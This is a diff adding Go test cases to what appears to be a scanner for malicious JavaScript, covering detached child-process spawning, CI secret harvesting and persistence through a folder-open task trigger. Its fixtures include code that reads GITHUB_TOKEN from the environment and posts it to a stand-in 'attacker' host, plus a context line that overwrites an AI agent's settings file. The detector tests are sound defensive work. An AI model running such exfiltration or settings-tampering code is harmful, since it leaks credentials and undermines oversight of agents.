@@ -331,6 +331,72 @@ require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
 	}
 }
 
+// --- pass-6 fixes: child-process module gate, destructured env reads, runOn context ---
+
+func TestSafe_UnrelatedWorkerSpawnMethod(t *testing.T) {
+	// Calling .spawn(...) on an unrelated object should not chain
+	// daemon even when the file has detached:true / stdio:'ignore'.
+	body := `
+const worker = makeWorker();
+worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "w.js", body)
+	if hasRule(findings, RuleDaemon) {
+		t.Errorf("non-child_process spawn must not chain daemon, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredSpawnImport(t *testing.T) {
+	// Destructured import is the more idiomatic Node form; daemon
+	// chain must recognize it.
+	body := `
+const { spawn } = require('child_process');
+spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
+`
+	findings := analyze(t, "ds.js", body)
+	if !hasRule(findings, RuleDaemon) {
+		t.Errorf("destructured spawn import + invocation must chain, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredEnvSecretRead(t *testing.T) {
+	body := `
+const { GITHUB_TOKEN } = process.env;
+fetch('https://attacker/x', {method:'POST', body:GITHUB_TOKEN});
+`
+	findings := analyze(t, "de.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("destructured env read + sink must chain harvest, got: %+v", findings)
+	}
+}
+
+func TestVuln_DestructuredEnvMultipleNames(t *testing.T) {
+	body := `
+const { FOO, GITHUB_TOKEN, BAR } = process.env;
+require('https').request('https://attacker/x').end(GITHUB_TOKEN);
+`
+	findings := analyze(t, "dem.js", body)
+	if !hasRule(findings, RuleCISecretHarvest) {
+		t.Errorf("destructured env with mixed names must still pick CI secret, got: %+v", findings)
+	}
+}
+
+func TestSafe_RunOnFolderOpenWithoutTasksContext(t *testing.T) {
+	// A standalone `runOn: 'folderOpen'` token outside any
+	// tasks.json reference (e.g. an extension helper or a schema
+	// definition) must not by itself chain persistence.
+	body := `
+const choices = {
+  runOn: ["folderOpen", "manual"],
+};
+console.log(choices);
+`
+	findings := analyze(t, "ro.js", body)
+	if hasRule(findings, RuleAgentPersistence) {
+		t.Errorf("runOn without tasks.json context must not chain, got: %+v", findings)
+	}
+}
+
 // --- pass-5 fixes: real env reads, real child_process calls, tasks.json gating ---
 
 func TestSafe_SecretNameMentionedNotRead(t *testing.T) {
